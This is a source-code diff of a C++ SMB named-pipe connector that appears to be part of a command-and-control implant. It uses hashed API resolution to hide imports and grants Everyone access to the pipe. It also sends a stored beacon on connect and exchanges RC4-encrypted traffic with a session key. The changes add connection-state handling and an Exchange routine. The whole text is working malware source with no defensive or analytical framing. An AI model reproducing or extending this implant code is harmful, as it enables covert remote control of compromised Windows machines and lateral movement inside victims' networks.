@@ -2,6 +2,7 @@
 #include "ApiLoader.h"
 #include "ApiDefines.h"
 #include "ProcLoader.h"
+#include "Crypt.h"
 #include "utils.h"
 
 void* ConnectorSMB::operator new(size_t sz) 
@@ -42,16 +43,25 @@ ConnectorSMB::ConnectorSMB()
 	this->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
 }
 
-BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorSMB::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
 {
-	PSID pEveryoneSID = NULL;
+	ProfileSMB profile = *(ProfileSMB*)profilePtr;
+
+	if (beatData && beatDataSize) {
+		this->beat = (BYTE*)MemAllocLocal(beatDataSize);
+		if (this->beat) {
+			memcpy(this->beat, beatData, beatDataSize);
+			this->beatSize = beatDataSize;
+		}
+	}
+	PSID pEveryoneSID = nullptr;
     SID_IDENTIFIER_AUTHORITY pIdentifierAuthority;
     *(DWORD*)pIdentifierAuthority.Value = 0;
     *(WORD*)&pIdentifierAuthority.Value[4] = 256;
     if (!this->functions->AllocateAndInitializeSid(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
         return FALSE;
 
-	PACL pACL = NULL;
+	PACL pACL = nullptr;
     EXPLICIT_ACCESS pListOfExplicitEntries = { 0 };
     pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE; //  STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL; // 
     pListOfExplicitEntries.grfAccessMode        = SET_ACCESS;
@@ -59,7 +69,7 @@ BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
     pListOfExplicitEntries.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
     pListOfExplicitEntries.Trustee.ptstrName    = (LPTSTR)pEveryoneSID;
 
-    if (this->functions->SetEntriesInAclA(1, &pListOfExplicitEntries, 0, &pACL) != ERROR_SUCCESS)
+    if (this->functions->SetEntriesInAclA(1, &pListOfExplicitEntries, nullptr, &pACL) != ERROR_SUCCESS)
         return FALSE;
 
     PSECURITY_DESCRIPTOR pSD = this->functions->LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
@@ -155,22 +165,65 @@ void ConnectorSMB::RecvClear()
 
 void ConnectorSMB::Listen()
 {
-    while ( !this->functions->ConnectNamedPipe(this->hChannel, NULL) && this->functions->GetLastError() != ERROR_PIPE_CONNECTED);
+    while ( !this->functions->ConnectNamedPipe(this->hChannel, nullptr) && this->functions->GetLastError() != ERROR_PIPE_CONNECTED);
 
     this->recvData = (BYTE*) this->functions->LocalAlloc(LPTR, 0x100000);
     this->allocaSize = 0x100000;
 }
 
-void ConnectorSMB::Disconnect() 
+BOOL ConnectorSMB::WaitForConnection()
+{
+    this->Listen();
+    this->SendData(this->beat, this->beatSize);
+    this->connected = TRUE;
+    return TRUE;
+}
+
+BOOL ConnectorSMB::IsConnected()
+{
+    return this->connected;
+}
+
+void ConnectorSMB::Disconnect()
+{
+    this->DisconnectInternal();
+    this->connected = FALSE;
+}
+
+void ConnectorSMB::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+    if (plainData && plainSize > 0) {
+        EncryptRC4(plainData, plainSize, sessionKey, 16);
+        this->SendData(plainData, plainSize);
+    } else {
+        this->SendData(NULL, 0);
+    }
+
+    if (this->recvSize == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
+        TEB->LastErrorValue = 0;
+        this->connected = FALSE;
+        return;
+    }
+
+    if (this->recvSize < 0) {
+        this->connected = FALSE;
+        return;
+    }
+
+    if (this->recvSize > 0 && this->recvData)
+        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+}
+
+void ConnectorSMB::DisconnectInternal() 
 {
     if (this->allocaSize) {
         memset(this->recvData, 0, this->allocaSize);
         this->functions->LocalFree(this->recvData);
-        this->recvData = NULL;
+        this->recvData = nullptr;
     }
 
     this->allocaSize = 0;
-    this->recvData = 0;
+    this->recvData = nullptr;
 
     this->functions->FlushFileBuffers(this->hChannel);
     this->functions->DisconnectNamedPipe(this->hChannel);
@@ -178,5 +231,10 @@ void ConnectorSMB::Disconnect()
 
 void ConnectorSMB::CloseConnector()
 {
+    if (this->beat && this->beatSize) {
+        MemFreeLocal((LPVOID*)&this->beat, this->beatSize);
+        this->beat = nullptr;
+        this->beatSize = 0;
+    }
     this->functions->NtClose(this->hChannel);
 }
